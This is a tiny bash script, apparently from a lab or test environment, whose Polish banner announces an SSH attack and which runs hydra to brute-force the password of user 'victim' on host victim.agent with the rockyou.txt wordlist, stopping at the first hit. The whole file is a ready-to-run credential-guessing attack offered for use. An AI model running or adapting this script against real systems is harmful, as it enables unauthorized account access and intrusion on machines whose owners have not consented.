#!/bin/bash

echo "[*] Atak na SSH na victim.agent..."

hydra -l victim -P /usr/share/wordlists/rockyou.txt ssh://victim.agent -t 4 -f